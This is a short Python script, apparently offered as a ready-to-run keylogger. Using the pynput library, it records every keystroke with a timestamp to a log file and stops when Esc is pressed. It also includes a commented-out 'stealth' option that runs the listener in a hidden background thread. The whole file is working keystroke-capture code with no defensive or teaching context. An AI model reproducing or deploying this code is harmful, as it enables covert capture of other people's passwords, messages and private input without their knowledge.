from pynput import keyboard
import logging
import os
from datetime import datetime

# Create a secure logs directory
log_dir = "logs"
if not os.path.exists(log_dir):
    os.makedirs(log_dir)

# Generate a timestamped log file
log_file = os.path.join(log_dir, f"keylog_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt")

# Configure logging
logging.basicConfig(
    filename=log_file,
    level=logging.DEBUG,
    format='%(asctime)s | Key: %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)

def on_press(key):
    try:
        logging.info(f"{key.char}")
    except AttributeError:
        logging.info(f"[{key}]")  # Special keys like Enter, Ctrl, etc.

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener with Esc key
        return False

# Optional: Run in background (uncomment for stealth)
# import threading
# listener_thread = threading.Thread(target=keyboard.Listener(on_press=on_press, on_release=on_release).start)
# listener_thread.start()

# Start keylogger
print("[*] Keylogger started. Press ESC to stop.")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

print(f"[*] Logging complete. File saved to {log_file}")
